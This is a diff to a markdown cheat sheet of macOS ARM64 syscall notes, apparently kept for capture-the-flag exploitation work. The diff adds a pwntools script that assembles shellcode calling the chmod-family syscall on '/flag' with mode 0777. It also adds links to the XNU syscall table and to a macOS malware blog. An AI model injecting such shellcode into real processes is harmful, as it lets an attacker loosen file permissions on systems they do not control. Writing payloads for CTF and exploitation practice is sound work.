@@ -263,6 +263,29 @@ https://arm64.syscall.sh/
 mov x16, 0x2000000 | n
 svc     #0x80
 ```
+
+
+
+### chmod MacOs arm64
+
+```
+from pwn import *
+context.arch = 'aarch64'
+
+
+asm_bytes = asm(f"""
+mov x0, #{-100 & 0xffffffffffffffff}
+adr x1, flag
+mov x2, #{0o777}
+
+movz    x16, #0x1d3
+movk    x16, #0x2000, lsl #16
+svc     #0x80
+flag:
+     .ascii "/flag\\0"
+""")
+
+```
 https://github.com/opensource-apple/xnu/blob/master/bsd/kern/syscalls.master
 
 reference: https://cocomelonc.github.io/macos/2025/07/18/malware-mac-6.html
